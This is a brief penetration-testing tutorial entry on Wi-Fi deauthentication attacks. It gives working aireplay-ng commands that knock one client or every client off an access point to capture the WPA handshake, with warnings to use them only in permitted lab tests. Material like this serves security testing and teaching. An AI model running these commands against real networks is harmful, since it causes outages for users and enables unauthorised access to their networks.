Deauthentication attack
Send targeted deauth frames to force a client to reconnect and trigger the four-way handshake.
Command example
sudo aireplay-ng --deauth 5 -a <TARGET_AP_BSSID> -c <TARGET_CLIENT_MAC> wlan0mon
# Or deauth all clients
sudo aireplay-ng --deauth 5 -a <TARGET_AP_BSSID> wlan0mon
Guidelines & mistakes
  • Use a small number of deauth frames in a lab to minimize disruption.
  • Confirm handshake capture quickly and stop injection immediately.
  • Do not run deauth on networks without permission; it is disruptive.
Warning

Continuous deauth can cause service outage. Only use in controlled tests.
